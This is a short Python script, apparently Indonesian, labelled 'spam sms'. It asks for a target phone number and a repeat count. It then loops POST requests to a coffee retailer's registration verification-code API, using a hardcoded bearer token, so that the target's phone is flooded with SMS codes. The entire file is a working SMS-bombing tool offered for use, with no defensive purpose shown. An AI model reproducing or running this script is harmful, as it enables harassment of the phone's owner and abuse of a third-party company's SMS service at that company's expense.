import os,requests,sys,json,time
os.system("clear")

logo="""
 	 spam sms
\033[1;33m<——————————————————————————>
 \033[4;32m[•] \033[1;34mAUTHOR  : AmjadOficial
 \033[1;36m[•] \033[1;35mYOUTUBE : AmjadOficial
 \033[1;35m[•] \033[1;36mGITHUB  : AmjadOficial
\033[1;33m<——————————————————————————>
"""

print(logo)

print("\033[1;35mTunggu sebentar !!!")

time.sleep(5)
no=input("\033[1;33mnomor target : " )
jum=int(input("\033[1;33mjumlah  : "))

head ={
"Host":"api.ottencoffee.co.id",
"content-length":"38",
"accept":"application/json, text/plain, */*",
"content-type":"application/json",
"sec-ch-ua-mobile":"?1",
"authorization":"Bearer PIxtGSz7OihS9hFmcfBGRrrhRqLjvfmAiRfsB58gDjRgIt2yWnD4EgH7huRd+rnBQ1F6LT2H1beLXOVxNVGYiJoO1q4XnjNSe2L8N5E/s0+MocPvqhV73c/QHiJe9ifxhur18LnmUm72/yqA55eEliMy83XX3nMTFnuxQ7QVYdaSP2o8xMvvtCzasZmkZWr4nGtD8gRgPVeFhX7vfx6xuhk3x8b9nZbn6Q/XCKG2K5y8A8cHM0EiCmbTSOZdjaFiJGx7pgnY0lvA/wAZsSg5JRx/gQ5PqXaFF+gKq30OtXPkDK0y6wHi4k+7d47gA9p+MyJN2+eTteVaTdT13UqdTX7k9ElXicO3+CQzfQ==",
"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform":"Android",
"origin":"https://ottencoffee.co.id",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://ottencoffee.co.id/register",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}

data = json.dumps({"sentBy":"sms","to":"+62" + no})
for i in range(jum):
 pos = requests.post("https://api.ottencoffee.co.id/v3/auth/register/code/request" ,headers=head,data=data).text
 if "message" in pos:
  print("\033[4;32msukses")
 else:
  print("gagal")
